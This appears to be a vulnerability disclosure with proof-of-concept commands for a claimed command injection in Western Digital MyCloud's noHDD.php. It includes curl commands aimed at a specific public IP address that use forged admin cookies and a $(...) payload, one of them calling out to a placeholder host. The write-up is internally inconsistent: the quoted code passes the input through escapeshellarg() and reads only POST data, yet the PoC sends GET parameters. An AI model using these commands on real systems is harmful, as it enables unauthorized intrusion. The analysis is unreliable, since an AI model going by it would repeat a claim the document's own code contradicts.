## Western Digital MyCloud Remote Command Injection in noHDD.php

#### The latest firmware download link:https://downloads.wdc.com/nas/My_Cloud_GLCR_2.42.115.bin

### Description

#### /web/php/noHDD.php

A remote command execution vulnerability exists in the "php/noHDD.php" script within the Western Digital MyCloud <=v2.42.115  web interface.

##### Remote Command Execution

The "php/noHDD.php" file is vulnerable to a remote command execution bug allowing for a logged in user to execute commands.The following code illustrates the vulnerability.

php/noHDD.php

```php
$cmd = $_POST['cmd'];
$enable = $_POST['enable'];	//enable or disable

switch ($cmd) {
	case "getDiskStatus":
		getDiskStatus();
		break;
	case "setSataPower":
		setSataPower($enable);
		break;
}
function setSataPower($enable)
{
	$state = "ok";
	if(file_exists("/tmp/system_ready"))
	{
		$setCmd = sprintf("sata_power.sh %s", escapeshellarg($enable));
		exec($setCmd,$retval);
	}
	else
	{
		$state = "ng";
	}

	if($enable=="enable")
	{
		sleep(30);
	}
	header('Content-type: text/xml');
	echo "<info><status>$state</status><cmd>$setCmd</cmd></info>";
}
```

![image-20250528160204779](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505281602912.png)

```
In the above code, the "cmd" request variable (which can be from a get, post, or cookie) value is used to control the flow and is then stored in the local variable "$cmd". If the value supplied is "setSataPower", the function setSataPower() is called  with the "$enable" variable as an argument. The "$enable" variable contains the value from the user supplied "enable" request variable (which can be from a get, post, or cookie).  "$enable" is stored as the first argument to a sh script "sata_power.sh" in the $setCmd variable. The "$setCmd" variable is then used as an argument to the PHP exec() function, which executes the command.
```

The above does depend on the /tmp/system_ready file existing.

### **POC**

```
curl -i "http://213.60.33.2/web/php/noHDD.php?cmd=setSataPower&enable=%24(your command)" --cookie "isAdmin=1;username=admin"

curl -i "http://213.60.33.2/web/php/noHDD.php?cmd=setSataPower&enable=%24(curl%20http:%2F%2Fip:port)" --cookie "isAdmin=1;username=admin"
```



![image-20250528152634521](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505281526698.png)
